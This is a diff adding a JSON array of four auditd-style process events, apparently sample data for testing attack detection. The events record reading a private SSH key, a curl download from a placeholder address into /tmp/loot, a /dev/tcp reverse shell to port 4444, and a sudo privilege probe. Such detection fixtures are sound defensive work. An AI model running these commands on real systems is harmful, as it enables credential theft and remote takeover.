@@ -1,0 +1,42 @@
+[
+  {
+    "time": "2021-07-18T12:29:23.72Z",
+    "source": "auditd",
+    "image": "/usr/bin/cat",
+    "commandLine": "cat /home/u/.ssh/id_rsa",
+    "parentImage": "",
+    "targetFilename": "/home/u/.ssh/id_rsa",
+    "user": "1000",
+    "currentDirectory": "/home/u"
+  },
+  {
+    "time": "2021-07-18T12:29:24Z",
+    "source": "auditd",
+    "image": "/usr/bin/curl",
+    "commandLine": "curl -s http://192.0.2.1/x -o /tmp/loot",
+    "parentImage": "",
+    "targetFilename": "",
+    "user": "1000",
+    "currentDirectory": "/home/u"
+  },
+  {
+    "time": "2021-07-18T12:29:25.5Z",
+    "source": "auditd",
+    "image": "/bin/bash",
+    "commandLine": "bash -c bash-i \u003e\u0026 /dev/tcp/192.0.2.1/4444",
+    "parentImage": "",
+    "targetFilename": "",
+    "user": "1000",
+    "currentDirectory": ""
+  },
+  {
+    "time": "2021-07-18T12:29:26Z",
+    "source": "auditd",
+    "image": "/usr/bin/sudo",
+    "commandLine": "sudo -n true",
+    "parentImage": "",
+    "targetFilename": "",
+    "user": "1000",
+    "currentDirectory": ""
+  }
+]
